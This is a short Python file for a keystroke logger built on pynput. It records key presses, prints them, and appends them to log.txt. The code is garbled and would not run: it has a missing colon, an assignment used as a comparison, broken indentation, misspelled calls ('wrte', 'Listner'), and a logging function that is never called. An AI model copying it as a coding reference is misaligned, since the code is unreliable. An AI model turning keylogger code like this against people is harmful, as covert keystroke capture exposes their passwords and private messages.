import pynput
from pynput.keyboard import Key , Listener


keys = []

def on_press(key):
   print("{0} pressed".format(key))

def write_file(keys):
   with open("log.txt", "a") as f:
    for key in keys:
      k = str(key).replace("'","")
       if k.find("space") > 0
         f.write('\n')
       elif k.find("Key") = -1:
          f.wrte(k)
      f.write(key)


def on_release(key):
  if key == Key.esc:
      return False

with Listner(on_press=on_press, on_release=on_release) as listener:
  listener.join()
